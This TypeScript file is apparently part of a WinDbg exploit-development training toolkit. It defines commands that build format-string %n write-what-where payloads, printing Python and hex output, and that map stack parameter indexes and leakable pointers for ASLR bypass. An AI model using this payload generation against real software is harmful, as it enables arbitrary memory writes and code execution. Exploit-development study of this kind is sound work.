import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";
import { getPointerSize, readPointer, tryReadMemory } from "../core/memory";
import { normalizeByteArray } from "../core/validation";
import { findModuleByAddress } from "./modules";
import { buildFormatString, parseU32, FmtWidth, FmtWrite } from "../logic/fmtstr_logic";

function hexByte(value: number): string {
  return value.toString(16).toUpperCase().padStart(2, "0");
}

function toPythonBytes(bytes: number[]): string {
  return `b"${bytes.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("")}"`;
}

function isPrintableAscii(bytes: number[]): boolean {
  return bytes.every((b) => b >= 0x20 && b <= 0x7e);
}

function parseWrites(raw: unknown): FmtWrite[] {
  if (!Array.isArray(raw)) {
    // Allow a single { addr, value } object for the common one-write case.
    if (raw && typeof raw === "object") {
      return parseWrites([raw]);
    }
    throw new Error("writes must be an array of { addr, value } pairs.");
  }
  return raw.map((entry, i) => {
    if (!entry || typeof entry !== "object") {
      throw new Error(`writes[${i}] must be an object with addr and value.`);
    }
    const record = entry as Record<string, unknown>;
    if (record.addr === undefined || record.value === undefined) {
      throw new Error(`writes[${i}] requires both addr and value.`);
    }
    return { addr: parseU32(record.addr), value: parseU32(record.value) };
  });
}

function normalizeWidth(value: unknown): FmtWidth {
  if (value === "byte" || value === "word" || value === "dword") {
    return value;
  }
  return "word";
}

function createFmtBuildCommand(): Command {
  return {
    name: "fmt_build",
    description: "Build a format-string %n write-what-where payload.",
    usage: `dx @$osed().fmt.build({ writes: [{ addr: 0x00402118, value: 0x625011AF }], argIndex: 6 })`,
    examples: [
      `dx @$osed().fmt.build({ writes: [{ addr: 0x00402118, value: 0x625011AF }], argIndex: 6 })`,
      `dx @$osed().fmt.build({ writes: [{ addr: 0x00402118, value: 0x625011AF }], argIndex: 6, width: "word", exclude: [0,10,13] })`,
    ],
    schema: {
      writes: { type: ["array", "object"], required: true },
      argIndex: { type: "number", min: 1, required: true },
      width: { type: "string", enum: ["byte", "word", "dword"], default: "word" },
      exclude: { type: "array", elementType: "number", default: [0, 10, 13] },
      prefix: { type: "number", min: 0, default: 0 },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const writes = parseWrites(options.writes);
      const argIndex = options.argIndex as number;
      const width = normalizeWidth(options.width);
      const normalizedExclude = normalizeByteArray((options.exclude as number[] | undefined) ?? [0, 10, 13]);
      const prefix = (options.prefix as number | undefined) ?? 0;

      const result = buildFormatString({
        writes,
        argIndex,
        width,
        exclude: normalizedExclude.values,
        prefix,
      });

      const warnings = [...result.warnings];
      if (normalizedExclude.warning) {
        warnings.push(normalizedExclude.warning);
      }

      out.section("Format String Builder");
      out.info(`Writes:   ${writes.length} (${width}-granularity, ${result.rows.length} chunks)`);
      out.info(`ArgIndex: ${argIndex}  Prefix: ${prefix}`);

      out.section("Chunk breakdown");
      out.table(
        [
          { key: "chunk", header: "Chunk", width: 6 },
          { key: "addr", header: "TargetAddr", width: 12 },
          { key: "value", header: "Value", width: 8 },
          { key: "arg", header: "Arg", width: 5 },
          { key: "count", header: "CumCount", width: 10 },
          { key: "spec", header: "Specifier", width: 18 },
        ],
        result.rows.map((row) => ({
          chunk: `${row.chunk}`,
          addr: `0x${row.targetAddr.toString(16).toUpperCase().padStart(8, "0")}`,
          value: `0x${row.value.toString(16).toUpperCase()}`,
          arg: `${row.arg}`,
          count: `${row.cumCount}`,
          spec: row.specifier,
        })),
      );

      out.section("Address block");
      for (let i = 0; i < result.addressDwords.length; i += 1) {
        const dword = result.addressDwords[i];
        const bytes = result.addressBlock.slice(i * 4, i * 4 + 4).map(hexByte).join(" ");
        out.print(`  ${bytes}    ; slot ${i} -> %${argIndex + i}$  (0x${dword.toString(16).toUpperCase().padStart(8, "0")})`);
      }

      out.section("Format string");
      out.print(result.formatString);

      out.section("Python");
      out.print("def p32(v): return struct.pack('<I', v)");
      out.print("payload = (");
      for (const dword of result.addressDwords) {
        out.print(`    p32(0x${dword.toString(16).toUpperCase().padStart(8, "0")}) +`);
      }
      const fmtBytes = [...result.formatString].map((ch) => ch.charCodeAt(0));
      const fmtLiteral = isPrintableAscii(fmtBytes) ? `b"${result.formatString.replace(/"/g, '\\"')}"` : toPythonBytes(fmtBytes);
      out.print(`    ${fmtLiteral}`);
      out.print(")");

      out.section("Payload (hex)");
      out.print(result.payload.map(hexByte).join(" "));

      if (warnings.length > 0) {
        out.section("Warnings");
        for (const warning of warnings) {
          out.warn(warning);
        }
      }

      out.whyItMatters("Format-string %n writes are pure arithmetic on the printed-byte count — automating it removes the most error-prone hand calculation in the module.");

      return {
        command: "fmt_build",
        args: options,
        success: true,
        findings: [
          {
            width,
            argIndex,
            prefix,
            addressDwords: result.addressDwords,
            formatString: result.formatString,
            payload: result.payload,
            rows: result.rows,
          },
        ],
        warnings,
        errors: [],
      };
    },
  };
}

function readStackPointer(pointerSize: 4 | 8): bigint | undefined {
  const thread = host.currentThread as unknown as Record<string, unknown>;
  const regsRoot = (thread?.Registers as Record<string, unknown> | undefined) ?? undefined;
  const userRegs = (regsRoot?.User as Record<string, unknown> | undefined) ?? regsRoot;
  if (!userRegs) {
    return undefined;
  }
  const name = pointerSize === 8 ? "rsp" : "esp";
  for (const key of Object.keys(userRegs)) {
    if (key.toLowerCase() === name || key.toLowerCase() === (pointerSize === 8 ? "esp" : "rsp")) {
      try {
        const value = (userRegs as Record<string, unknown>)[key];
        if (typeof value === "bigint") return value;
        if (typeof value === "number") return BigInt(value);
        const parsed = BigInt(String(value));
        return parsed;
      } catch (_error) {
        return undefined;
      }
    }
  }
  return undefined;
}

function stackBounds(pointerSize: 4 | 8): { base?: bigint; limit?: bigint } {
  if (pointerSize !== 4) {
    return {};
  }
  const thread = host.currentThread as unknown as Record<string, unknown>;
  let teb: bigint | undefined;
  const raw = thread?.Teb ?? (thread as Record<string, unknown>)?.TebAddress;
  try {
    if (typeof raw === "bigint") teb = raw;
    else if (typeof raw === "number") teb = BigInt(raw);
    else if (raw !== undefined) teb = BigInt(String(raw));
  } catch (_error) {
    teb = undefined;
  }
  if (teb === undefined) {
    return {};
  }
  try {
    // x86 NtTib: StackBase at +0x04, StackLimit at +0x08.
    const base = readPointer(teb + BigInt(4), 4);
    const limit = readPointer(teb + BigInt(8), 4);
    return { base, limit };
  } catch (_error) {
    return {};
  }
}

function classify(value: bigint, marker: number, bounds: { base?: bigint; limit?: bigint }, sp: bigint | undefined): string {
  if ((value & BigInt(0xffffffff)) === BigInt(marker >>> 0)) {
    return "marker";
  }
  const module = findModuleByAddress(value);
  if (module) {
    return `ptr->${module.name}`;
  }
  if (bounds.base !== undefined && bounds.limit !== undefined && value >= bounds.limit && value < bounds.base) {
    return "ptr->stack";
  }
  if (bounds.base === undefined && sp !== undefined) {
    const delta = value > sp ? value - sp : sp - value;
    if (delta < BigInt(0x100000)) {
      return "ptr->stack";
    }
  }
  if (tryReadMemory(value, 4)) {
    return "ptr->readable";
  }
  return "";
}

function createFmtOffsetCommand(): Command {
  return {
    name: "fmt_offset",
    description: "Locate the controlled parameter index and leakable pointers on the stack at a printf-family call.",
    usage: "dx @$osed().fmt.offset(0x41414141, 40, 8)",
    examples: [
      "dx @$osed().fmt.offset()",
      "dx @$osed().fmt.offset(0x41414141, 40)",
      "dx @$osed().fmt.offset({ marker: 0x41414141, count: 40, firstArg: 8 })",
    ],
    schema: {
      marker: { type: "number", default: 0x41414141 },
      count: { type: "number", min: 1, max: 256, default: 40 },
      firstArg: { type: "number", min: 0, default: 8 },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const pointerSize = getPointerSize();
      const marker = ((options.marker as number | undefined) ?? 0x41414141) >>> 0;
      const count = (options.count as number | undefined) ?? 40;
      const firstArg = (options.firstArg as number | undefined) ?? 8;

      const warnings: string[] = [];
      if (pointerSize !== 4) {
        warnings.push("fmt.offset parameter mapping is calibrated for x86 (cdecl) printf-family calls.");
      }

      const sp = readStackPointer(pointerSize);
      if (sp === undefined) {
        return {
          command: "fmt_offset",
          args: options,
          success: false,
          findings: [],
          warnings,
          errors: ["Stack pointer unavailable — is the target broken in?"],
        };
      }

      const bounds = stackBounds(pointerSize);
      const base = sp + BigInt(firstArg);

      type Row = { idx: number; stackAddr: bigint; value: bigint; meaning: string };
      const rows: Row[] = [];
      let markerIndex: number | undefined;

      for (let i = 0; i < count; i += 1) {
        const stackAddr = base + BigInt(i * 4);
        const cell = tryReadMemory(stackAddr, 4);
        if (!cell) {
          warnings.push(`Stack read failed at ${out.formatAddress(stackAddr, pointerSize)}; stopping scan.`);
          break;
        }
        const value = BigInt(cell[0] | (cell[1] << 8) | (cell[2] << 16) | (cell[3] << 24)) & BigInt(0xffffffff);
        const meaning = classify(value, marker, bounds, sp);
        const idx = i + 1; // %1$ is the first vararg
        if (meaning === "marker" && markerIndex === undefined) {
          markerIndex = idx;
        }
        rows.push({ idx, stackAddr, value, meaning });
      }

      out.section("Format String Parameter Map");
      out.info(`${pointerSize === 8 ? "RSP" : "ESP"}: ${out.formatAddress(sp, pointerSize)}  firstArg: +${firstArg}  marker: 0x${marker.toString(16).toUpperCase().padStart(8, "0")}`);
      out.info(markerIndex !== undefined ? `Controlled parameter index: %${markerIndex}$  (use argIndex ${markerIndex} in fmt.build)` : "Marker not found in scanned range — adjust firstArg/count or check the buffer.");

      out.table(
        [
          { key: "idx", header: "Idx", width: 5 },
          { key: "stackAddr", header: "StackAddr", width: 12 },
          { key: "value", header: "Value", width: 12 },
          { key: "meaning", header: "Meaning", width: 18 },
        ],
        rows.map((row) => ({
          idx: `%${row.idx}$`,
          stackAddr: out.formatAddress(row.stackAddr, pointerSize),
          value: `0x${row.value.toString(16).toUpperCase().padStart(8, "0")}`,
          meaning: row.meaning || "-",
        })),
      );
      out.whyItMatters("Format-string exploitation hinges on knowing which parameter index reaches your buffer and which stack slots leak module/stack pointers for ASLR defeat.");

      return {
        command: "fmt_offset",
        args: options,
        success: true,
        findings: [{ markerIndex, esp: sp, firstArg, marker, slots: rows }],
        warnings,
        errors: [],
      };
    },
  };
}

export function createFmtCommands(): Command[] {
  return [createFmtBuildCommand(), createFmtOffsetCommand()];
}
